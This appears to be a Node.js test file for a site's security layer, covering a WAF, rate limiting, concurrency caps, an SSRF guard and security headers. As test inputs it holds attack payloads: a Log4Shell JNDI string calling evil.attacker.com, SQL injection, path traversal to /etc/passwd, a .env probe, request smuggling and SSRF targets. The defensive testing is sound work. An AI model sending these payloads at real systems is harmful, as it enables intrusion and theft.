import assert from "node:assert/strict";
import test from "node:test";

import {
  acquireConcurrencySlot,
  applySecurityHeaders,
  checkRateLimit,
  coalesceInFlight,
  constantTimeEquals,
  extractClientFingerprint,
  extractClientIp,
  inspectIncomingRequest,
  isIpQuarantined,
  resetSecurityStateForTests,
} from "./security.server";
import { assertSafeUrl, classifyIp, readBoundedText } from "./trace-ssrf.server";

test("WAF allows legitimate analyzer and API requests", () => {
  resetSecurityStateForTests();
  const req = new Request(
    "https://rca.crosx.in/api/public/trace?url=https%3A%2F%2Fexample.com%2Foffer%3Fclick_id%3D123",
    {
      method: "GET",
      headers: {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
        "cf-connecting-ip": "203.0.113.42",
      },
    },
  );
  const verdict = inspectIncomingRequest(req);
  assert.equal(verdict.ok, true);
  assert.equal(verdict.status, 200);
  assert.equal(extractClientIp(req), "203.0.113.42");
  assert.ok(extractClientFingerprint(req).startsWith("203.0.113.42:"));
});

test("WAF blocks vulnerability scanners, jammers, Log4Shell, Prototype Pollution, Request Smuggling, path traversal, dotfiles, SQLi/XSS, and auto-quarantines repeat attackers", () => {
  resetSecurityStateForTests();
  const baseTime = 1_700_000_000_000;

  // 1. Disallowed HTTP method
  const deleteVerb = inspectIncomingRequest(
    new Request("https://rca.crosx.in/", { method: "DELETE" }),
    baseTime,
  );
  assert.equal(deleteVerb.ok, false);
  assert.equal(deleteVerb.status, 405);

  // 2. Scanner & Jammer User-Agents
  const scannerReq = inspectIncomingRequest(
    new Request("https://rca.crosx.in/", {
      headers: { "user-agent": "sqlmap/1.8.4#stable (https://sqlmap.org)" },
    }),
    baseTime,
  );
  assert.equal(scannerReq.ok, false);
  assert.equal(scannerReq.status, 403);

  const jammerReq = inspectIncomingRequest(
    new Request("https://rca.crosx.in/", {
      headers: { "user-agent": "bombardier/v1.2.6" },
    }),
    baseTime,
  );
  assert.equal(jammerReq.ok, false);
  assert.equal(jammerReq.status, 403);

  // 3. Dotfile probe (/.env)
  const envProbe = inspectIncomingRequest(new Request("https://rca.crosx.in/.env"), baseTime);
  assert.equal(envProbe.ok, false);
  assert.equal(envProbe.status, 403);

  // 4. Path traversal
  const traversal = inspectIncomingRequest(
    new Request("https://rca.crosx.in/assets/%2e%2e%2fetc/passwd"),
    baseTime,
  );
  assert.equal(traversal.ok, false);
  assert.equal(traversal.status, 403);

  // 5. SQLi / XSS query payload
  const sqli = inspectIncomingRequest(
    new Request(
      "https://rca.crosx.in/links?q=%27%20UNION%20SELECT%20*%20FROM%20information_schema",
    ),
    baseTime,
  );
  assert.equal(sqli.ok, false);
  assert.equal(sqli.status, 403);

  // 6. Log4Shell / JNDI header injection
  const log4shell = inspectIncomingRequest(
    new Request("https://rca.crosx.in/", {
      headers: { "x-api-version": "${jndi:ldap://evil.attacker.com/a}" },
    }),
    baseTime,
  );
  assert.equal(log4shell.ok, false);
  assert.equal(log4shell.status, 403);

  // 7. Prototype Pollution & NoSQL Injection
  const protoPollution = inspectIncomingRequest(
    new Request("https://rca.crosx.in/links?__proto__=polluted"),
    baseTime,
  );
  assert.equal(protoPollution.ok, false);
  assert.equal(protoPollution.status, 403);

  // 8. HTTP Request Smuggling (Transfer-Encoding + Content-Length conflict)
  const smuggling = inspectIncomingRequest(
    new Request("https://rca.crosx.in/api/public/trace", {
      method: "POST",
      headers: {
        "transfer-encoding": "chunked",
        "content-length": "42",
      },
    }),
    baseTime,
  );
  assert.equal(smuggling.ok, false);
  assert.equal(smuggling.status, 400);

  // 9. Forbidden reverse-proxy route-override header
  const proxyOverride = inspectIncomingRequest(
    new Request("https://rca.crosx.in/", {
      headers: { "x-original-url": "/admin" },
    }),
    baseTime,
  );
  assert.equal(proxyOverride.ok, false);
  assert.equal(proxyOverride.status, 403);

  // 10. Oversized payload
  const oversized = inspectIncomingRequest(
    new Request("https://rca.crosx.in/api/public/trace", {
      method: "POST",
      headers: { "content-length": "500000" },
    }),
    baseTime,
  );
  assert.equal(oversized.ok, false);
  assert.equal(oversized.status, 413);

  // 11. Automatic IP Quarantine after 3 WAF exploit strikes
  const hackerIp = "198.51.100.250";
  for (let i = 0; i < 3; i++) {
    const r = inspectIncomingRequest(
      new Request("https://rca.crosx.in/.env", {
        headers: { "cf-connecting-ip": hackerIp },
      }),
      baseTime + i * 10,
    );
    assert.equal(r.ok, false);
  }
  const qStatus = isIpQuarantined(hackerIp, baseTime + 100);
  assert.equal(qStatus.quarantined, true);
  assert.ok(qStatus.retryAfterSeconds >= 50);

  // Even a benign request from the quarantined IP is immediately rejected while quarantined
  const benignFromQuarantined = inspectIncomingRequest(
    new Request("https://rca.crosx.in/", {
      headers: { "cf-connecting-ip": hackerIp },
    }),
    baseTime + 200,
  );
  assert.equal(benignFromQuarantined.ok, false);
  assert.equal(benignFromQuarantined.status, 403);
  assert.match(benignFromQuarantined.reason ?? "", /quarantined/i);
});

test("Burst rate limiter throttles rapid floods, blocks UA-rotation jammers, and applies repeat-offender lockout", () => {
  resetSecurityStateForTests();
  const baseTime = 1_700_000_000_000;
  const client = "198.51.100.99:bot";

  // Trace tier allows up to 8 requests per 5s burst
  for (let i = 0; i < 8; i++) {
    const r = checkRateLimit(client, "trace", baseTime + i * 50);
    assert.equal(r.ok, true);
  }

  // 9th request within the same 5s burst is throttled with 429
  const ninth = checkRateLimit(client, "trace", baseTime + 500);
  assert.equal(ninth.ok, false);
  assert.equal(ninth.status, 429);
  assert.ok(ninth.retryAfterSeconds >= 1);

  // Repeated violations trigger penalty lockout
  checkRateLimit(client, "trace", baseTime + 600);
  const locked = checkRateLimit(client, "trace", baseTime + 700);
  assert.equal(locked.ok, false);
  assert.equal(locked.status, 429);
  assert.ok(locked.retryAfterSeconds >= 25);

  // Anti-Jammer UA-Rotation Test: a jammer on 198.51.100.200 rotating User-Agent on every request
  // still hits the aggregate per-IP burst ceiling (8 * 1.5 = 12 requests per 5s)
  const jammerIp = "198.51.100.200";
  for (let i = 0; i < 12; i++) {
    const rotatedVerdict = checkRateLimit(
      `${jammerIp}:rotated-ua-${i}`,
      "trace",
      baseTime + i * 20,
    );
    assert.equal(rotatedVerdict.ok, true);
  }
  const thirteenthRotated = checkRateLimit(`${jammerIp}:rotated-ua-999`, "trace", baseTime + 300);
  assert.equal(
    thirteenthRotated.ok,
    false,
    "Expected UA-rotating jammer from the same IP to be throttled by aggregate IP ceiling",
  );
  assert.equal(thirteenthRotated.status, 429);
});

test("Multi-user single-time concurrency semaphore caps simultaneous in-flight slots and releases cleanly", () => {
  resetSecurityStateForTests();
  const ip = "198.51.100.77";
  const leases = [];

  // Trace tier allows 4 concurrent requests per IP
  for (let i = 0; i < 4; i++) {
    const lease = acquireConcurrencySlot(ip, "trace");
    assert.equal(lease.ok, true);
    leases.push(lease);
  }

  // 5th simultaneous request from the same IP is rejected
  const fifth = acquireConcurrencySlot(ip, "trace");
  assert.equal(fifth.ok, false);
  assert.match(fifth.reason ?? "", /simultaneous/i);

  // Another user on a different IP can still acquire slots concurrently
  const otherUser = acquireConcurrencySlot("198.51.100.88", "trace");
  assert.equal(otherUser.ok, true);

  // Releasing a slot allows the first IP to proceed again
  leases[0]!.release();
  const afterRelease = acquireConcurrencySlot(ip, "trace");
  assert.equal(afterRelease.ok, true);

  // Cleanup
  leases.forEach((l) => l.release());
  otherUser.release();
  afterRelease.release();
});

test("Singleflight coalesces concurrent identical work into a single execution", async () => {
  resetSecurityStateForTests();
  let executions = 0;

  const task = async () => {
    executions += 1;
    await new Promise((r) => setTimeout(r, 25));
    return { status: 200, finalUrl: "https://rca.crosx.in/" };
  };

  const callers = Array.from({ length: 12 }, () =>
    coalesceInFlight("trace:desktop-chrome:https://rca.crosx.in", task),
  );
  const results = await Promise.all(callers);

  assert.equal(executions, 1, "Expected 12 simultaneous identical requests to execute once");
  for (const res of results) {
    assert.equal(res.finalUrl, "https://rca.crosx.in/");
  }
});

test("SSRF blocks DNS-rebinding domains, hex/shorthand IPv4, AWS IPv6 IMDS, and stream bombs are capped by readBoundedText", async () => {
  // 1. DNS-rebinding & SSRF callback domains
  const nipIo = await assertSafeUrl("http://127.0.0.1.nip.io/admin");
  assert.equal(nipIo.ok, false);
  assert.match(nipIo.reason ?? "", /DNS-rebinding/i);

  const oastify = await assertSafeUrl("https://abc123xyz.oastify.com/callback");
  assert.equal(oastify.ok, false);

  // 2. Hex, shorthand, and AWS IPv6 IMDS literals
  assert.ok(classifyIp("0x7f.0.0.1"));
  assert.ok(classifyIp("127.1"));
  assert.ok(classifyIp("fd00:ec2::254"));
  assert.ok(classifyIp("255.255.255.255"));

  // 3. Streaming byte-bounded reader stops chunked stream bombs at exact maxBytes limit
  const largePayload = "A".repeat(50_000);
  const streamResponse = new Response(largePayload, {
    status: 200,
    headers: { "content-type": "text/html" },
  });
  const bounded = await readBoundedText(streamResponse, 4096);
  assert.equal(bounded.length, 4096);
});

test("Security headers and constant-time comparison work deterministically", () => {
  assert.equal(constantTimeEquals("secret-token-123", "secret-token-123"), true);
  assert.equal(constantTimeEquals("secret-token-123", "secret-token-124"), false);
  assert.equal(constantTimeEquals("short", "longer-secret"), false);

  const res = applySecurityHeaders(new Response("ok", { status: 200 }), 12.34);
  assert.equal(res.headers.get("x-frame-options"), null);
  assert.equal(res.headers.get("x-content-type-options"), "nosniff");
  assert.equal(res.headers.get("x-download-options"), "noopen");
  assert.equal(res.headers.get("cross-origin-opener-policy"), "same-origin-allow-popups");
  assert.ok(res.headers.get("strict-transport-security")?.includes("max-age=63072000"));
  assert.ok(res.headers.get("content-security-policy")?.includes("frame-ancestors 'self'"));
  assert.ok(res.headers.get("content-security-policy")?.includes("https://aistudio.google.com"));
  assert.equal(res.headers.get("server-timing"), "ssr;dur=12.3");
});
